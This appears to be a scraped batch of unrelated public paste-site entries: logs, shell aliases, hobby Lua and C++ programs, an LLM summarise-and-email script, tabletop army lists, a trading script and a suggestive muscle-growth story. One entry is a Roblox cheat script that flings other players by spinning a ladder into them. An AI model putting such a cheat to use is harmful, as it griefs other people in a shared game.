Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,162 - evseMQTT - INFO - Write complete
Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,296 - evseMQTT - INFO - Received command 257
Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,297 - evseMQTT - INFO - Device responded with 257, containing {'system_time': '2025-03-23T16:04:31', 'system_time_raw': 1742738671}
Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,299 - evseMQTT - INFO - Message published: 30136
Mar 23 16:04:32 carpi2 python[477]: 2025-03-23 16:04:32,610 - evseMQTT - INFO - Received command 10
Mar 23 16:04:32 carpi2 python[477]: 2025-03-23 16:04:32,612 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:04:35 carpi2 python[477]: 2025-03-23 16:04:35,290 - evseMQTT - INFO - Received command 4
Mar 23 16:04:35 carpi2 python[477]: 2025-03-23 16:04:35,291 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:04:35 carpi2 python[477]: 2025-03-23 16:04:35,294 - evseMQTT - INFO - Message published: 30137
Mar 23 16:04:39 carpi2 python[477]: 2025-03-23 16:04:39,623 - evseMQTT - INFO - Received command 10
Mar 23 16:04:39 carpi2 python[477]: 2025-03-23 16:04:39,624 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,196 - evseMQTT - INFO - Received command 3
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,197 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,198 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,251 - evseMQTT - INFO - Write complete
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,251 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,288 - evseMQTT - INFO - Write complete
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,421 - evseMQTT - INFO - Received command 257
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,422 - evseMQTT - INFO - Device responded with 257, containing {'system_time': '2025-03-23T16:04:41', 'system_time_raw': 1742738681}
Mar 23 16:04:41 carpi2 python[477]: 2025-03-23 16:04:41,424 - evseMQTT - INFO - Message published: 30138
Mar 23 16:04:42 carpi2 python[477]: 2025-03-23 16:04:42,004 - evseMQTT - INFO - Received command 5
Mar 23 16:04:42 carpi2 python[477]: 2025-03-23 16:04:42,005 - evseMQTT - INFO - Device sent a charge status
"
ZGJuVcWw,aliases,wagnux,Bash,Sunday 23rd of March 2025 08:23:46 AM CDT," # some more ls aliases
  91   │ alias ll='lsd -alF'
  92   │ alias la='lsd -A'
  93   │ alias l='ls -CF'
  94   │ alias atualizar='echo Atualizando lista de repositório e pacotes... ; sudo systemctl daemon-reload ; sudo nala upgrade -y && echo Efetuando limpeza... ; sleep 3 ; sudo nala autoremove -y ; sudo nala autopurge -y ; sudo apt autoclean ; 
       │ echo Atualizando pacotes flatpak... ; sleep 3 ; flatpak update -y ; sleep 3 ; echo Atualizando snaps... ; sleep 3 ; sudo snap refresh ; cd ~ ; echo Limpando snaps antigos... ; sleep 3 ; sudo ./snapclean.sh && echo Otimizando disco... ;
       │  sleep 3 ; sudo fstrim -v / && echo Otimizando pacotes... ; sleep 3 ; sudo prelink -amRv ; sudo apt install'
  95   │ alias update='sudo systemctl daemon-reload ; sudo nala update'
  96   │ alias ifconfig.me='curl ifconfig.me/ip'
  97   │ alias fix-disco='cd / ; sudo touch /forcefsck' 
  98   │ alias cls='clear'
  99   │ alias dir='ls -alh'
 100   │ alias ipconfig='ifconfig'
 101   │ alias testevelocidade='speedtest -s 3065'
 102   │ #alias testevelocidade='speedtest -s 33956'
 103   │ alias ifconfig.co='curl -4 ifconfig.co ; curl -6 ifconfig.co'
 104   │ alias ifconfog='ifconfig'
 105   │ alias pc-system='echo $XDG_CURRENT_DESKTOP ; echo $XDG_SESSION_TYPE ; [ -d /sys/firmware/efi ] && echo UEFI || echo BIOS ; mokutil --sb-state'
 106   │ alias distro='batcat /etc/os-release'
 107   │ alias bios='sudo dmidecode -t bios | less'
 108   │ alias fixaudio='systemctl --user restart wireplumber pipewire pipewire-pulse ; rm -r ~/.config/pulse'
 109   │ alias flatsnap='flatpak upgrade -y ; sudo snap refresh'
 110   │ alias bat='batcat'
 111   │ alias note='gnome-text-editor'
 112   │ alias tempo='curl wttr.in/rio?lang=pt'
"
KXftRAZ7,test 6,yeeeeeeeeeeeee,Lua,Sunday 23rd of March 2025 07:56:19 AM CDT,"-- Yeeet OS Main Script (startup.lua)

-- Cat ASCII Art for Loading Screen
local catArt = [[
 /\_/\  
( o.o ) 
 > ^ <
]]

-- Save Theme to File
local function saveTheme(theme)
    local file = fs.open(""theme.txt"", ""w"")
    file.write(theme)
    file.close()
end

-- Load Theme from File
local function loadTheme()
    if fs.exists(""theme.txt"") then
        local file = fs.open(""theme.txt"", ""r"")
        local theme = file.readAll()
        file.close()
        return theme
    else
        return ""light"" -- Default to Light Mode
    end
end

-- Apply Theme
local function applyTheme(theme)
    if theme == ""dark"" then
        term.setBackgroundColor(colors.black)
        term.setTextColor(colors.white)
    elseif theme == ""light"" then
        term.setBackgroundColor(colors.white)
        term.setTextColor(colors.black)
    elseif theme == ""superlight"" then
        term.setBackgroundColor(colors.white)
        term.setTextColor(colors.lightGray)
    end
    term.clear()
end

-- Loading Screen Function
local function loadingScreen()
    term.clear()
    term.setCursorPos(1, 1)
    print(""===== Yeeet OS ====="")
    print("""")

    -- Print cat art on both sides
    local width, height = term.getSize()
    for line in string.gmatch(catArt, ""[^\n]+"") do
        term.setCursorPos(1, term.getCursorPos())
        print(line)
        term.setCursorPos(width - #line + 1, term.getCursorPos() - 1)
        print(line)
    end

    -- Print loading bar in the middle
    term.setCursorPos(1, height)
    print(""Loading..."")
    for i = 1, 20 do
        sleep(0.2) -- Simulate slow loading
        write(""="")
    end
    sleep(1)
    term.clear()
end

-- Home Screen Navigation
local menuOptions = { ""Open Drawing"", ""Open Programming"", ""Show Time"", ""Change Theme"", ""Shutdown"", ""Uninstall OS"" }
local selectedIndex = 1

local function drawMenu()
    term.clear()
    term.setCursorPos(1, 1)
    print(""===== Yeeet OS ====="")
    print(""Use Arrow Keys to Navigate and Enter to Select"")

    for i, option in ipairs(menuOptions) do
        if i == selectedIndex then
            print(""-> "" .. option)
        else
            print(""   "" .. option)
        end
    end
end

local function changeTheme()
    term.clear()
    term.setCursorPos(1, 1)
    print(""Select a Theme:"")
    print(""1. Dark Mode"")
    print(""2. Light Mode"")
    print(""3. Super Light Mode (Not Recommended)"")
    write(""Enter your choice (1-3): "")
    local choice = read()

    if choice == ""1"" then
        saveTheme(""dark"")
        applyTheme(""dark"")
        print(""Dark Mode activated!"")
    elseif choice == ""2"" then
        saveTheme(""light"")
        applyTheme(""light"")
        print(""Light Mode activated!"")
    elseif choice == ""3"" then
        saveTheme(""superlight"")
        applyTheme(""superlight"")
        print(""Super Light Mode activated! Good luck reading."")
    else
        print(""Invalid choice. Returning to Home Screen."")
    end

    sleep(2)
end

-- Home Screen Function
local function homeScreen()
    while true do
        drawMenu()
        local event, key = os.pullEvent(""key"")

        if key == keys.up then
            selectedIndex = selectedIndex - 1
            if selectedIndex < 1 then
                selectedIndex = #menuOptions
            end
        elseif key == keys.down then
            selectedIndex = selectedIndex + 1
            if selectedIndex > #menuOptions then
                selectedIndex = 1
            end
        elseif key == keys.enter then
            if menuOptions[selectedIndex] == ""Open Drawing"" then
                shell.run(""draw.lua"")
            elseif menuOptions[selectedIndex] == ""Open Programming"" then
                shell.run(""programming.lua"")
            elseif menuOptions[selectedIndex] == ""Show Time"" then
                term.clear()
                term.setCursorPos(1, 1)
                print(""Current time: "" .. textutils.formatTime(os.time(), true))
                print(""\nPress any key to return."")
                os.pullEvent(""key"")
            elseif menuOptions[selectedIndex] == ""Change Theme"" then
                changeTheme()
            elseif menuOptions[selectedIndex] == ""Shutdown"" then
                os.shutdown()
            elseif menuOptions[selectedIndex] == ""Uninstall OS"" then
                shell.run(""uninstall.lua"")
            end
        end
    end
end

-- Main Execution
local theme = loadTheme()
applyTheme(theme)
loadingScreen()
homeScreen()
"
dNs51bew,cipher.cpp,DrAungWinHtut,C++,Sunday 23rd of March 2025 07:54:56 AM CDT,"#include<iostream>
#include<cstdlib>
#include<cstring>

using namespace std;
char* encrypt(const char* message, const int count, char* cipher, const int cipher_count);
char* decrypt(const char* cipher, const int count, char* plain, const int plain_count);
const char alpha[28] = ""ABCDEFGHIJKLMNOPQRSTUVWXYZ "";
const char specialChars[28] = {
        '-', '!', '+', '\\', '~', '@', '^', '$', '[', '/',
        '>', ']', '#', '}', '(', '%', '*', '<', '}', '&',
        ')', ' ', ';', '|', ':', ',', '""','\0' // Space at index 21, quote at index 26
};


int main()
{
	/*for (int i = 0; i < 28; i++)
	{
		if (alpha[i] == '\0')
			break;
		
		cout << alpha[i] << "" - ""<<specialChars[i]<<endl;
	}*/
	
	char message[10000] = { '\0' };
	char cipher[10000] = { '\0' };
	char plain[10000] = { '\0' };
	cout << ""Enter the message to be encrypted: "";
	cin.getline(message, 10000);
	int count = strlen(message);
	encrypt(message, count,cipher,10000);

	cout << endl;
	for (int i = 0; i < count; i++)
	{
		cout << cipher[i];
	}
	cout << endl;

	decrypt(cipher, count, plain, 10000);
	for (int i = 0; i < count; i++)
	{
		cout << plain[i];
	}
	cout << endl;
	return 0;
}

char* encrypt(const char* message, const int count,char *cipher,const int cipher_count)
{	
	char msg = '\0';	
	for (int i = 0; i < count; i++)
	{
		for (int j = 0; j < 28; j++)
		{
			if (message[i] == '\0')
				break;
			if (message[i] >96)
			{
				msg = message[i] - ('a' - 'A');				
			}
			else
			{
				msg = message[i];
			}
			

			if (msg == alpha[j])
			{
				cipher[i] = specialChars[j];
				break;
			}
		}
	}
	return cipher;
}

char* decrypt(const char* cipher, const int count, char* plain, const int plain_count)
{
	char cip = '\0';
	for (int i = 0; i < count; i++)
	{
		for (int j = 0; j < 28; j++)
		{
			if (cipher[i] == '\0')
				break;
			cip = cipher[i];


			if (cip == specialChars[j])
			{
				plain[i] = alpha[j];
				break;
			}
		}
	}
	return plain;
}
"
gzGJccCG,"Simple Agent (Monitor, Summarize, Email)",AightBits,Python,Sunday 23rd of March 2025 07:26:43 AM CDT,"import os
import time
import requests
import smtplib
from email.message import EmailMessage

# === Configuration ===

# Folder to watch
FOLDER = ""./watch""

# LLM settings
API_KEY = """"
API_URL = ""http://localhost:8000/v1/chat/completions""
MODEL = """"
TEMPERATURE = 0.5
SYSTEM_PROMPT = ""You are a helpful assistant that summarizes documents clearly and concisely.""

# Email settings
SMTP_SERVER = ""smtp.example.com""
SMTP_PORT = 587
EMAIL_ADDRESS = ""sender@example.com""
EMAIL_PASSWORD = ""email-password""
SEND_TO = ""recipient@example.com""

# Internal tracking
PROCESSED = set()

# === Core Functions ===

def summarize(content):
    headers = {""Content-Type"": ""application/json""}
    if API_KEY:
        headers[""Authorization""] = f""Bearer {API_KEY}""

    payload = {
        ""model"": MODEL,
        ""messages"": [
            {""role"": ""system"", ""content"": SYSTEM_PROMPT},
            {""role"": ""user"", ""content"": f""Summarize this file:\n\n{content}""}
        ],
        ""temperature"": TEMPERATURE
    }

    response = requests.post(API_URL, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()[""choices""][0][""message""][""content""]

def send_email(subject, body):
    msg = EmailMessage()
    msg[""Subject""] = subject
    msg[""From""] = EMAIL_ADDRESS
    msg[""To""] = SEND_TO
    msg.set_content(body)

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
        smtp.starttls()
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

    print(f""Email sent to {SEND_TO}"")

def run_agent():
    os.makedirs(FOLDER, exist_ok=True)
    print(f""Watching folder: {FOLDER}"")

    while True:
        files = [f for f in os.listdir(FOLDER) if f.endswith("".txt"")]

        for filename in files:
            path = os.path.join(FOLDER, filename)
            if path in PROCESSED:
                continue

            with open(path, ""r"") as f:
                content = f.read()

            print(f""Processing: {filename}"")
            try:
                summary = summarize(content)
                send_email(f""Summary of {filename}"", summary)
                PROCESSED.add(path)
            except Exception as e:
                print(f""Error processing {filename}: {e}"")

        time.sleep(5)

if __name__ == ""__main__"":
    run_agent()"
4fYQGWMU,dataNone,TestGuy1,JSON,Sunday 23rd of March 2025 07:00:09 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c18ade6ea0db38016e3c096a5187d5c649d1c855beffa42f607365a826d75d73596829f6ad86873660efb0173813b2cc26396d228bdb0f2a24cf3311c2048477130d2066467f27f33989861c78b05ffecb92ad8cf4fc0d0c829d02669cad6b36817e35eb6e17b0bfec15ef6d41c9e4f29d86482f4c8d8620f14e583b31096be1',
  otherdata: [
    '90b8652d4b53fc6aeca507fc0ff98b98',
    '43250ee720ea57df14331dd33da2755a',
    '739f8bfee1e8d0ef0423143294517a54',
    '92454fe83ecc67ca49461789fc1d1fae',
    '5239cc5e1dd6c31cb381c3016f488719',
    'de8b7d418dbd619af516d0a995f691da',
    '80fecf384d45273ab02cd87d28723fc3',
    '94a8ec1e4797d7405ebf4304bd63d4dd'
  ]
}"
XHjTYTWE,Round 5 - IG Zach,TableTopLive,PHP,Sunday 23rd of March 2025 06:57:10 AM CDT,"ask to see my dornhole (1995 points)

Astra Militarum
Strike Force (2000 points)
Hammer of the Emperor


CHARACTERS

Rogal Dorn Commander (280 points)
• 1x Armoured tracks
1x Coaxial autocannon
1x Heavy stubber
2x Meltagun
2x Multi-melta
1x Oppressor cannon
1x Pulveriser cannon
• Enhancement: Calm Under Fire

Rogal Dorn Commander (265 points)
• 1x Armoured tracks
1x Coaxial autocannon
1x Heavy stubber
2x Meltagun
2x Multi-melta
1x Oppressor cannon
1x Pulveriser cannon

Tech-Priest Enginseer (45 points)
• Warlord
• 1x Enginseer axe
1x Mechanicus pistol
1x Servo-arm

Ursula Creed (65 points)
• 1x Duty and Vengeance
1x Power weapon


DEDICATED TRANSPORTS

Taurox (65 points)
• 1x Armoured tracks
1x Storm bolter
1x Twin autocannon

Taurox (65 points)
• 1x Armoured tracks
1x Storm bolter
1x Twin autocannon


OTHER DATASHEETS

Catachan Heavy Weapons Squad (65 points)
• 3x Heavy Weapons Team
• 3x Lasgun
3x Mortar
3x Weapons team close combat weapons

Catachan Heavy Weapons Squad (65 points)
• 3x Heavy Weapons Team
• 3x Lasgun
3x Mortar
3x Weapons team close combat weapons

Catachan Heavy Weapons Squad (65 points)
• 3x Heavy Weapons Team
• 3x Lasgun
3x Mortar
3x Weapons team close combat weapons

Hellhound (125 points)
• 1x Armoured tracks
1x Heavy flamer
1x Hunter-killer missile
1x Inferno cannon

Hellhound (125 points)
• 1x Armoured tracks
1x Heavy flamer
1x Hunter-killer missile
1x Inferno cannon

Leman Russ Battle Tank (175 points)
• 1x Armoured tracks
1x Heavy stubber
1x Hunter-killer missile
1x Lascannon
1x Leman Russ battle cannon
2x Multi-melta

Leman Russ Battle Tank (175 points)
• 1x Armoured tracks
1x Heavy stubber
1x Hunter-killer missile
1x Lascannon
1x Leman Russ battle cannon
2x Multi-melta

Ratlings (60 points)
• 5x Ratling Sniper
• 5x Close combat weapon
5x Sniper rifle

Ratlings (60 points)
• 5x Ratling Sniper
• 5x Close combat weapon
5x Sniper rifle

Rogal Dorn Battle Tank (240 points)
• 1x Armoured tracks
1x Coaxial autocannon
1x Heavy stubber
2x Meltagun
2x Multi-melta
1x Oppressor cannon
1x Pulveriser cannon

Scout Sentinels (55 points)
• 1x Close combat weapon
1x Hunter-killer missile
1x Lascannon
1x Sentinel chainsaw"
3yh089U7,steep steps fling/spin,qweptus,Lua,Sunday 23rd of March 2025 06:57:00 AM CDT,"local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local runService = game:GetService(""RunService"")
local userInput = game:GetService(""UserInputService"")
local spinning = false
local ladder
local connection

local function toggleLadderSpin()
    local playerPlaced = workspace:FindFirstChild(""playerPlaced"")
    if not playerPlaced then return end

    if not spinning then
        for _, obj in pairs(playerPlaced:GetChildren()) do
            if obj:IsA(""Model"") and obj.Name == ""YOUR USERNAME HERE_ladder"" then
                ladder = obj:FindFirstChild(""Handle"") or obj:FindFirstChildWhichIsA(""Part"")
                if ladder then
                    ladder.Anchored = false
                    ladder.Massless = true

 ladder.CFrame = character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(90), 0, 0)

                    
                    spinning = true
                    connection = runService.Heartbeat:Connect(function()
                        if ladder and character and character:FindFirstChild(""HumanoidRootPart"") then
                            local root = character.HumanoidRootPart
                            ladder.CFrame = root.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(90), tick() * 5, 0)
                        end
                    end)

                    
                    ladder.Touched:Connect(function(hit)
                        if spinning then
                            local victim = hit.Parent
                            if victim and victim:FindFirstChild(""Humanoid"") then
                                local flingDirection = Vector3.new(math.random(-50, 50), 150, math.random(-50, 50))
                                victim:FindFirstChild(""HumanoidRootPart"").Velocity = flingDirection
                            end
                        end
                    end)
                end
            end
        end
    else
        
        spinning = false
        if connection then connection:Disconnect() end
        if ladder then
            ladder.Anchored = true 
        end
    end
end


userInput.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.F then
        toggleLadderSpin()
    end
end)"
QJ9cw8JU,Round 5 - SW Dan,TableTopLive,PHP,Sunday 23rd of March 2025 06:56:40 AM CDT," FACTION KEYWORD: Imperium - Adeptus Astartes - Space Wolves
+ DETACHMENT: Stormlance Task Force
+ TOTAL ARMY POINTS: 2000pts
+
+ WARLORD: Char1: Logan Grimnar
+ ENHANCEMENT: Hunter's Instincts (on Char3: Wolf Guard Battle Leader on Thunderwolf)
+ NUMBER OF UNITS: 16
+ SECONDARY: - Bring It Down: (3x2) - Assassination: 7 Characters
+++++++++++++++++++++++++++++++++++++++++++++++

Char1: 1x Logan Grimnar (115 pts): Warlord, Storm Bolter, The Axe Morkai
Char2: 1x Ragnar Blackmane (90 pts): Bolt Pistol, Frostfang
Char3: 1x Lieutenant with Combi-weapon (70 pts): Combi-weapon, Paired Combat Blades
Char4: 1x Wolf Guard Battle Leader on Thunderwolf (80 pts): Storm shield and close combat weapon, Close combat weaponCrushing teeth and claws, Power fist, Close combat weapon
Char5: 1x Wolf Guard Battle Leader on Thunderwolf (105 pts): Storm shield and close combat weapon, Close combat weaponCrushing teeth and claws, Power fist, Close combat weapon
Enhancement: Hunter's Instincts (+25 pts)
Char6: 1x Wolf Lord on Thunderwolf (100 pts): Relic shield and close combat weapon, Close combat weaponCrushing teeth and claws, Power Fist, Close combat weapon
Char7: 1x Wolf Lord on Thunderwolf (100 pts): Relic shield and close combat weapon, Close combat weaponCrushing teeth and claws, Power Fist, Close combat weapon

5x Assault Intercessors with Jump Packs (90 pts)
• 4x Assault Intercessors with Jump Pack
3 with Astartes Chainsword, Heavy Bolt Pistol
1 with Astartes Chainsword, Plasma Pistol
• 1x Assault Intercessor Sergeant with Jump Pack: Plasma Pistol, Power Fist
5x Assault Intercessors with Jump Packs (90 pts)
• 4x Assault Intercessors with Jump Pack
3 with Astartes Chainsword, Heavy Bolt Pistol
1 with Astartes Chainsword, Plasma Pistol
• 1x Assault Intercessor Sergeant with Jump Pack: Plasma Pistol, Power Fist
6x Bladeguard Veteran Squad (160 pts)
• 1x Bladeguard Veteran Sergeant: Master-crafted Power Weapon, Heavy Bolt Pistol
• 5x Bladeguard Veterans: 5 with Heavy Bolt Pistol, Master-crafted Power Weapon
5x Scout Squad (70 pts)
• 1x Scout Sergeant: Bolt Pistol, Close Combat Weapon, Astartes Chainsword
• 4x Scouts: 4 with Bolt Pistol, Close Combat Weapon, Combat Knife
6x Thunderwolf Cavalry (240 pts): 6 with Storm shield, Crushing teeth and claws, Heirloom weapon
6x Thunderwolf Cavalry (240 pts): 6 with Storm shield, Crushing teeth and claws, Heirloom weapon
1x Vindicator (185 pts): Armoured Tracks, Demolisher Cannon, Hunter Killer Missile, Storm Bolter
1x Vindicator (185 pts): Armoured Tracks, Demolisher Cannon, Hunter Killer Missile, Storm Bolter
1x Impulsor (80 pts): Armoured Hull, Ironhail Heavy Stubber, Ironhail Skytalon Array, 2x Storm Bolter"
ytwfENYs,Indicatore 3 Strategie Grezze TF MR BR,Maurizio-Ciullo,JavaScript,Sunday 23rd of March 2025 05:14:17 AM CDT,"  ///////////   Indicatore 3 Strategie Grezze Trend Following / Mean reversion / Break Out /////////

  //////////    Vedi Video Nella Cartella Corsi Unger video vari Trend Following o Mean Reverting /////////

input: TF(0), MR(0), BRK(0);
input: periodo(5);

// Trend following // Timeframe // Daily // Entro rottura canali massimi minimi 5 giorni fa // Uscita reverse massimo minimo dei canali o stop loss monetario 2000 //
if TF=1 then begin
	buy next bar highest(h, period) stop;
	sellshort next bar lowest(l, period) stop;
end;

// Mean Reverting // Timeframe // 60 Minuti // Entro tocco massimo minimo sessione precedente // Uscita reverse o Uscita Fine Sessione //
if MR=1 then begin
	if mp <= 0 then buy next bar lows(1) limit;
	if mp >= 0 then sellshort next bar highs(1) limit;
end;

// Break Out // Timeframe // 60 Minuti // Entro rottura massimo minimo sessione precedente// Uscita reverse o Uscita Fine Sessione //
if BRK=1 then begin
	buy next bar highs(1) stop;
	sellshort next bar lows(1) stop;
end;


// Uscita fine sessione
if BRK=1 or MR=1 then setexitonclose;

// UScita stop loss monetario per la trend following. Stop 2000 dollari non impostato ma sul video lo accenna.
setstopcontract;"
xMj4V5ne,badapple.lua,hhhzzzsss,Lua,Sunday 23rd of March 2025 05:11:46 AM CDT,"local component = require(""component"")
local event = require(""event"")
local filesystem = require(""filesystem"")
local bit32 = require(""bit32"")
local os = require(""os"")
local modem = component.modem

local CONTROLLER_PORT = 1
local WORKER_PORT = 2
local PING_TIMEOUT = 20
local AUDIO_FILE_PATH = ""/home/badapple.audio""  -- Path to the encoded audio file

local function tickTime()
    return os.time() * (1000/60/60)
end

-- Function to convert MIDI pitch to frequency in Hz
local function midiToFrequency(midiNote)
    return 440 * 2 ^ ((midiNote - 69) / 12)
end

-- Function to read a variable-length integer from the file
local function readVarInt(file)
    local value = 0
    local shift = 0
    while true do
        local byte = file:read(1)
        if not byte then return nil end
        byte = string.byte(byte)
        value = value + bit32.lshift(bit32.band(byte, 0x7F), shift)
        if bit32.band(byte, 0x80) == 0 then break end
        shift = shift + 7
    end
    return value
end

-- Step 1: Broadcast a ping to discover worker addresses
modem.open(WORKER_PORT)

local function discoverWorkers()
    local addresses = {}

    modem.broadcast(CONTROLLER_PORT, ""ping"")

    local deadline = tickTime() + PING_TIMEOUT
    while tickTime() < deadline do
        local _, _, from, port = event.pull((deadline - tickTime()) / 20, ""modem_message"")
        if port == WORKER_PORT then
            table.insert(addresses, from)
        end
    end

    return addresses
end

local workerAddresses = discoverWorkers()

if #workerAddresses == 0 then
    print(""No workers found. Exiting..."")
    return
end

-- Initialize worker availability tracking
local workerAvailability = {}
for _, address in ipairs(workerAddresses) do
    workerAvailability[address] = 0  -- All workers are initially free
end

-- Step 2: Read the encoded audio file and play notes
if not filesystem.exists(AUDIO_FILE_PATH) then
    print(""Audio file not found: "" .. AUDIO_FILE_PATH)
    return
end

local file, err = io.open(AUDIO_FILE_PATH, ""rb"")
if not file then
    print(""Failed to open audio file: "" .. err)
    return
end

local referenceTick = tickTime()

while true do
    -- Read deltaTick
    local deltaTick = readVarInt(file)
    if not deltaTick then break end

    -- Read duration
    local durationTicks = readVarInt(file)
    if not durationTicks then break end

    -- Read pitch
    local pitchByte = file:read(1)
    if not pitchByte then break end
    local pitch = string.byte(pitchByte)

    -- Wait until desired time
    referenceTick = referenceTick + deltaTick
    while tickTime() < referenceTick do
        os.sleep(0.01)  -- Sleep to avoid busy waiting
    end

    -- Convert pitch to frequency and duration to seconds
    local frequency = midiToFrequency(pitch)
    local durationSeconds = durationTicks * 0.05

    -- Find the earliest available worker
    local currentTick = tickTime()
    local earliestFreeTime = math.huge
    local selectedWorker = nil
    for address, freeTime in pairs(workerAvailability) do
        if freeTime < earliestFreeTime then
            earliestFreeTime = freeTime
            selectedWorker = address
        end
    end

    if selectedWorker and workerAvailability[selectedWorker] <= currentTick then
        -- Send the note to the selected worker
        modem.send(selectedWorker, CONTROLLER_PORT, ""note"", frequency, durationSeconds - 0.1)
        -- Update the worker's next free time
        workerAvailability[selectedWorker] = currentTick + math.max(durationTicks, 3)
    else
        -- No workers are currently free; note cannot be played
        print(string.format(""Note at tick %.2f (frequency: %.2f Hz, duration: %.2f s) could not be played; all workers are busy."", currentTick, frequency, durationSeconds))
    end
end

file:close()
print(""Playback finished."")
"
arSieu8K,Sculptor Masseuse,YK7942,Lua,Sunday 23rd of March 2025 04:35:54 AM CDT,"**The Sculptor’s Touch**  

I had worked on plenty of athletes before, but none quite like Adrian. He lay stretched out on my massage table, the golden glow of his skin illuminated by the soft light of the room. His body was a masterpiece of hard-earned power—long, sinewy limbs carved from years of brutal training, his muscles sharp and defined like a marble statue chiseled to perfection.   

I warmed the massage oil between my palms, the scent of eucalyptus rising into the air. As I smoothed my hands over his broad shoulders, I felt the fine tremor of tension in his body, the coiled stiffness of muscles pushed past their limit. His trapezius was like thick ropes knotted under his skin, dense and unyielding beneath my touch.  

I pressed my thumbs in deeply, working slow, firm circles to loosen the fibers. Then, I felt it—his muscles shifting, expanding. The broad slope of his shoulders grew beneath my fingers, rounding out, becoming fuller, heavier. It was subtle at first, almost imperceptible, but then Adrian let out a deep, unguarded moan, and I saw it clearly—his body was growing.  

""Ahh—"" His breath hitched, a mix of relief and something deeper, more primal. He gripped the edge of the table, his fingers digging into the padded surface.  

My breath caught in my throat. I wasn’t imagining it. His deltoids swelled, the perfect caps rounding out his upper arms, their definition sharpening like they were being sculpted in real-time. His traps, once tense and wiry, smoothed into thick ridges, his entire upper back widening beneath my touch.  

“Jesus, Adrian…” I whispered, mesmerized.  

He let out a low, satisfied groan. “God, that feels incredible…” His voice was deeper now, huskier.  

I ran my hands down his back, gliding the oil along his lats. They flared under my touch, broadening, the once-streamlined V-shape of his torso thickening into something more powerful, more commanding. His skin was hot beneath my hands, as if his body was burning with new strength. I could feel every fiber of him tightening, expanding, sculpting itself into something beyond human.  

Moving lower, I traced the deep grooves of his erector spinae, the twin ridges along his spine hardening under my fingers. His entire back was changing, every muscle responding like clay being shaped beneath an artist’s hands.  

And then, my hands reached his glutes.  

They were already firm—taut and sculpted from years of training—but as I kneaded into the deep muscle, they surged under my grip. The swell of them became fuller, rounder, thick muscle expanding with each slow, deliberate press of my palms. Adrian moaned again, his hips shifting slightly against the table, his body adjusting to the new weight of himself.  

""Holy shit,"" he muttered, his voice dripping with pleasure and disbelief.  

I bit my lip, trying to stay focused as I worked the oil into his hamstrings, feeling them lengthen and harden beneath my hands. His quads, already powerful, thickened into deep, striated columns of muscle, pressing against the table as if they were outgrowing the very space they occupied.  

Everywhere I touched, he grew.  

His calves bulged, the diamond-shaped gastrocnemius muscle becoming more pronounced with each stroke. His forearms swelled under my kneading fingers, the veins rising against his golden skin like rivers branching across a landscape.  

Adrian groaned again, his breath shuddering. ""I can feel it,"" he whispered. ""Every stroke… it’s like you're molding me into something new.""  

I exhaled shakily, watching in awe as his entire body pulsed with raw, growing power beneath my hands. I didn’t know how or why this was happening, but as Adrian’s fingers clenched and his chest rose with each ragged breath, I knew one thing—he was loving every second of it."
g4CD21ER,Bombastic,brandblox,Python,Sunday 23rd of March 2025 04:01:52 AM CDT,"import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler
from sklearn.tree import DecisionTreeClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import precision_recall_fscore_support, confusion_matrix, accuracy_score, roc_curve, auc, classification_report
from sklearn.datasets import load_diabetes


def load_data():
    data = load_diabetes()
    df = pd.DataFrame(data.data, columns=data.feature_names)
    df = df.drop(columns=[""s1""])  # Dropping one unnecessary column
    df['target'] = (data.target > data.target.mean()).astype(int)  # Convert target to binary
    print(""First 5 rows of the dataset:"")
    print(df.head())
    return df

def split_data(df, target_column):
    X = df.drop(columns=[target_column])
    y = df[target_column]
    return train_test_split(X, y, test_size=0.2, random_state=42)

def scale_features(X_train, X_test):
    scaler = StandardScaler()
    X_train_scaled = scaler.fit_transform(X_train)
    X_test_scaled = scaler.transform(X_test)
    return X_train_scaled, X_test_scaled

def train_decision_tree(X_train, y_train):
    # model = LogisticRegression()
    model = DecisionTreeClassifier()
    model.fit(X_train, y_train)
    return model

def make_predictions(model, X_test):
    return model.predict(X_test)

def evaluate_model(y_test, y_pred):
    accuracy = accuracy_score(y_test, y_pred)
    precision, recall, f1, _ = precision_recall_fscore_support(y_test, y_pred, average='binary')
    print(f""Accuracy: {accuracy:.2f}, Precision: {precision:.2f}, Recall: {recall:.2f}, F1 Score: {f1:.2f}"")
    print(""\nClassification Report:\n"", classification_report(y_test, y_pred))

def plot_confusion_matrix(y_test, y_pred):
    cm = confusion_matrix(y_test, y_pred)
    sns.heatmap(cm, annot=True, fmt='d', cmap='Blues')
    plt.xlabel(""Predicted"")
    plt.ylabel(""Actual"")
    plt.title(""Confusion Matrix"")
    plt.show()

def plot_roc_curve(y_test, y_probs):
